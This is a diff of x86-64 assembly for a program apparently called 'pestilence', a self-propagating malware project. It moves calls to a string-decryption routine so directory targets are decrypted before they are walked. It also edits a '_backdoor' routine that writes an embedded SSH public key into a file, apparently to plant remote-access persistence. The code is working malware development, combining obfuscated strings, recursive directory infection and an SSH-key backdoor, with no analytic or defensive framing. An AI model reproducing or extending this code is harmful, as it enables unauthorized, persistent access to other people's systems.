@@ -24,14 +24,24 @@ _start:
     mov rdx, 0
 	mov rsi, dir1Len
     lea rdi, [rel dir1]                                   ; dir to open for arg initDir
-
-    ; mov rdi, dir1                                       ; dir to open for arg initDir
+	; rdi -> to _encrypt 
+	push rax
+	_dec_initD1:
+	call _decrypt_str
+	mov rdi, rax
+	pop rax
     call _initDir
 
     mov rdx, 0
 	mov rsi, dir2Len
     lea rdi, [rel dir2]
     ; mov rdi, dir2                                       ; dir to open for arg initDir
+	; rdi -> to _encrypt 
+	push rax
+	_dec_initD2:
+	call _decrypt_str
+	mov rdi, rax
+	pop rax
     call _initDir
 
     call _backdoor
@@ -71,12 +81,6 @@ _initDir:
     ; placing pestilence on the stack
     push rbp
     mov rbp, rsp
-	; rdi -> to _encrypt 
-	push rax
-	_dec_initD:
-	call _decrypt_str
-	mov rdi, rax
-	pop rax
     sub rsp, pestilence_size
 	lea r8, FAM(pestilence.fd)
 	or qword [r8], -1
@@ -155,11 +159,11 @@ _readDir:
 
             _recursif:
                 lea rdi, FAM(pestilence.pwd)
-				push rax
-				lea rsi, FAM(pestilence.pwd)
-				call _strlen
-				mov rsi, rax
-				pop rax
+				; push rax
+				; lea rsi, FAM(pestilence.pwd)
+				; call _strlen
+				; mov rsi, rax
+				; pop rax
                 lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
                 cmp BYTE [rdx], 0x2e
                 jne _callInit
@@ -594,7 +598,7 @@ _backdoor:
         _notFound:
             mov rdi, r9
             mov rax, SYS_WRITE
-            lea rsi, [rel sshPub]
+            ; lea rsi, [rel sshPub]
 			push rax
 			push rdi
 			lea rdi, [rel sshPub]
@@ -612,7 +616,7 @@ _backdoor:
 			; push rdi
 			; lea rdi, [rel back]
 			; mov rsi, backLen
-			_decNotFound1:
+			; _decNotFound1:
 			; call _decrypt_str
 			; mov rsi, rax
 			; pop rdi
